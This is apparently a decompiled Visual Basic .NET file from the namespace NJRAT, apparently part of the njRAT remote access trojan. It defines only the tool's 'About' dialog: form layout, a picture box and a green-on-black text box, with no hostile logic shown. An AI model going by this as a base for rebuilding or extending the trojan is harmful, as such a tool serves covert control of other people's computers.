Namespace NJRAT
	' Token: 0x0200000B RID: 11
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class About
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x0600009A RID: 154 RVA: 0x0014B630 File Offset: 0x00149A30
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x0600009B RID: 155 RVA: 0x0014B680 File Offset: 0x00149A80
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.NJRAT.About))
			Me.PictureBox1 = New Global.System.Windows.Forms.PictureBox()
			Me.RichTextBox1 = New Global.System.Windows.Forms.RichTextBox()
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			Me.SuspendLayout()
			Me.PictureBox1.Dock = Global.System.Windows.Forms.DockStyle.Left
			Me.PictureBox1.Image = CType(componentResourceManager.GetObject("PictureBox1.Image"), Global.System.Drawing.Image)
			Dim pictureBox As Global.System.Windows.Forms.Control = Me.PictureBox1
			Dim location As Global.System.Drawing.Point = New Global.System.Drawing.Point(0, 0)
			pictureBox.Location = location
			Me.PictureBox1.Name = "PictureBox1"
			Dim pictureBox2 As Global.System.Windows.Forms.Control = Me.PictureBox1
			Dim size As Global.System.Drawing.Size = New Global.System.Drawing.Size(168, 158)
			pictureBox2.Size = size
			Me.PictureBox1.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.StretchImage
			Me.PictureBox1.TabIndex = 0
			Me.PictureBox1.TabStop = False
			Me.RichTextBox1.BackColor = Global.System.Drawing.Color.Black
			Me.RichTextBox1.BorderStyle = Global.System.Windows.Forms.BorderStyle.None
			Me.RichTextBox1.Dock = Global.System.Windows.Forms.DockStyle.Fill
			Me.RichTextBox1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim richTextBox As Global.System.Windows.Forms.Control = Me.RichTextBox1
			location = New Global.System.Drawing.Point(168, 0)
			richTextBox.Location = location
			Me.RichTextBox1.Name = "RichTextBox1"
			Me.RichTextBox1.[ReadOnly] = True
			Dim richTextBox2 As Global.System.Windows.Forms.Control = Me.RichTextBox1
			size = New Global.System.Drawing.Size(285, 158)
			richTextBox2.Size = size
			Me.RichTextBox1.TabIndex = 1
			Me.RichTextBox1.Text = ""
			Dim autoScaleDimensions As Global.System.Drawing.SizeF = New Global.System.Drawing.SizeF(6F, 13F)
			Me.AutoScaleDimensions = autoScaleDimensions
			Me.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			Me.BackColor = Global.System.Drawing.SystemColors.ActiveCaptionText
			size = New Global.System.Drawing.Size(453, 158)
			Me.ClientSize = size
			Me.Controls.Add(Me.RichTextBox1)
			Me.Controls.Add(Me.PictureBox1)
			Me.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.FixedToolWindow
			Me.MaximizeBox = False
			Me.MinimizeBox = False
			Me.Name = "About"
			Me.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "About"
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).EndInit()
			Me.ResumeLayout(False)
		End Sub

		' Token: 0x04000048 RID: 72
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
